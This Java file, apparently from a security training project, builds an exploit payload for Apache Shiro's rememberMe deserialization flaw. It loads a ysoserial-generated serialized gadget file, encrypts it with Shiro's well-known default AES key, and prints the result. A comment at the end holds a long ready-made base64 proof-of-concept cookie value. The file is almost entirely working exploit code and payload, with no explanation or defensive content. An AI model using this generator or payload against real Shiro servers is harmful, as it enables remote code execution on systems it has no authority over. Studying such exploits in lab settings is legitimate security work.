package com.madaha.codesecone.controller.AdvancedAttack.deserialize.components.Exploit;

import org.apache.shiro.codec.Base64;
import org.apache.shiro.codec.CodecSupport;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.nio.file.Files;
import java.nio.file.Paths;

public class CreateClassByteCodeToBase64_Shiro {

    public static void main(String[] args) throws Exception {
//        byte[] payloads = Files.readAllBytes(Paths.get("E:\\xxx\\poc.ser"));
        byte[] payloads = Files.readAllBytes(Paths.get("C:\\Users\\ThreatBook\\IdeaProjects\\CodeSecOne\\src\\main\\resources\\static\\evil\\ysoserial\\shiro_poc_ser.txt"));

        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.decode(CodecSupport.toBytes("kPH+bIxk5D2deZiIxcaaaA=="));

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.println(ciphertext.toString());
    }

    //  POC: x2nwM3hiIPtBgx4L1qDWNKBLLhrb9e8hSJhViVOVqWuz9C6F8CbsHv6wqT9Yo4YBmZTzwIouZ4ivFkqp/L/kvW8ZyRkgK1fcWw5eTMWyi9TIg7UIncvjUF4v0xrxIuGesrJE6b4F9HM79MnGeH5LiY2EfdgVIKTFnd/IYokwJb4UA6RreNzsFVzaPuGTGi8RSFxnP7Gb+pfYA2RQ2fTxlZsX1HxKrWiJlOYQsZX3IG96FFJWc7sWyN3aWa9I0QkQ0dU2YFktrAzh9u0ajpRs/P4CAKAJmo+w60DGCG/vKXu0qs6ZRzWxpOTylUo/BUMbfn4tVx35ej/LVLv00KeaM9oYcTzcbnHs6lpD6PllAmAWHwQbeNP5A9o2wJ7v7i+ad81/O2uiL+alyk0qrgAsghAGTPlEYRX2PoUFKtfq2e+QFnmLBzSDSw6F3k9vM+cYGTct2Bv1ydCr18cJGvtCMFquiJGQD257jgvsO8wl0CVSeAKmGSOCd6GWY59/vF3QteYuM1NjP4O4v5dz1wApswiSN3F4QIRtO3XUTLDW3FnWxgLTUUquYZRpXgkT2eS5C6wTO2nhufkjeMxRjsH307i4aklRxnn2IpUmxbPtW8yT2j/6/EJvEtMJ6tLAk5FmRHdsUVWGbMFlHiPOIkmv1UpivXpYii2nLA3QVEtlMM/u+FqS+iAvwqyYQnox+zFBT128ufmx12PBVAfqhu4QQcmezDvOPHTf1pm+yA46QQoIiFxoKOBJ/FKeTGcGVAdchukkelnnJSb8mFgYRwhLrVEyf3MeYep3AE/DzIbUWnyjK/q0gZ+Tu0ZXfWeepKk0zZmTT+S32jJI35mwHJ+QQemoBFvuFGODhdZhrpwoRwmqELwBdvulMs5q2RJvIcJ2GHD4cjGM4mVEGknOOGFz80RX2Ntouf3Bjp2xR9HO8CUIpt3AAGRV7s6UaR6AfIXf1MNDW2ubAq+r4fFvgDn+cyN5Pbo8avB2RB2moz+dnDoy+nFG71llZH4ZbD1EwxONzkOvSkyNuGFtMuqUrdu/xX5iBKMtOeBe47Nlh9dZWJoiebQbbBRB+AH4uqdT7gP8lwgqwxzg3v1lfz1Pv3SgSqE+YoKbYEgPoNNT8HzKfZYW0FerfrKLYJg24T33Q3zyKP7KyD9bjp4qR1T6xtmZAXobjh3CJDRD3TkrRxtyjhEE0fbNjKQqF5Chkc0pV0h2SjBoN0hDA+LwyzaPW61n3uQPryI5Bb9mfDAlTM7R6zYIlkhDkm2iySFv0xAIzcYtpJtZrr/UCudjYoXrhUk5jp48E8lcA52acFC/Fxkx9ruhlad8eH4DSA44cu7j4S9Ch9P4vycXigic/W4bElT1zFVbry9C41JUfojhl6rnqs/5Z9BM07/aNcdFg9RSZAxxzi46tfOL32qAa3MvvUOrEg9ow2qKXMLOxrTbry7QgFWSb67P2IjPfHZadR1twi07raO/kHyrkF8BaH0cOjXdh26efTVhOJkETT/kYBFdAy6cQpmqd9oyd0twx37V/sRXaPG58cneKDUNVgYSlXGEZCPGc1iVeP7K/4g+HtfGEq0gk9DA9RdyKErtnzp67TZHNVszOEM7FS/PBpy0awT6WZP2stRJZkLty8CekbhNuVw1vD60x+OUMMc4ZMnSdYwopXkoeY6CdHanVwsKG4pelVe0589ZDnLJsj2JBSJVYt514Dh0IEJI8ibFevhZ1HWEko+HIyX0C4QY/6qhDsUT8hSZLgYm+xkz7dP5YGgyElstaUtAo9EsSTesfsrmJO3iR/NzpXk5KPbIQ3+3WT9ZgoCZWXnyOkQApIMUEN4Ij+H9xoEKJ+iD3dX0TM8TbYs1Q7Gsyl1YULcIITf5jLJ0uqGr27kl4w7/pJeJJGDp3G16AjRLChUkBjUBbPsAWR53WI4TXXGR9g8eVNplSOcDCfUVwTIVfawZDuNCOmj9Y+AnvzItyIhFDuGzmadjo3jN6WLHqggpooCbpmRKMs7TrljYcQIyk84xEkZiUdfioytsdz44nCu1ZQWXsW+QYGifOzjlSCE19p5kr8XB090zlK44NEwyiTb2KI31fYty8waCj6Q6jHo76EGdewsGdZz17tWjILNTtv23KkPpHLr/TPmm8qEA28tLJ0M7coeE9svmIjujoYOBvRuw5wlg8P7vnu6Me+BhZCT/TyH6QM713hB/W2156G78vLAf7eeSXYhj9quZnbkt5Lca0H3Fex22SzrXpzVl5QbWNxEG8AZ6aHZx86lqXsxlF/JTGgBud30ydoNZA7W3xWDD80sM6Wf6iN7b0+PYb+s+8pcOEcuR+Lf+ucjTWtxuPoxP3pu45w4wCQGvXJkMbYNtPnjFcwvkB+tbYwtIfb41onk3aP8/dZ8RcV9CeWVsyDs9xRFBMtaJ1K4pyGM5h6Em4XkoKv+JrM0mseBNjPpbGJUr2/MI5CMdeX/jsTJMO6ugWH8OcygW5p75n+Q+M+6iM+tn0+0TZNa2yV5XJ/4SMi8j/bEs2G/lJxag6EkwRBAme7woqDk/ZoDg0MmPHokBip6zUzbpeXBHk4kRCeSfRl2g6iA34PJszO+unHJs3Zq9FbjSIHnsIaz/exa8vcM1r7Ea2w+vRKXU9w5jxLq16smm/vy4moyefSYESr8NGHkzhgOgX9UlNvzbD2O1GIWQQm/PD7Yxk2l0Fb2TQV6ERkRWT5W/KM/J8Hq27HEEKv+CuqNDlx9wXg7C4YQzIXqZU5JIoLGOLgDpTPUnF2NDmmhjUdpLhkFU2v+425wy8auxpuBhhTc=
}
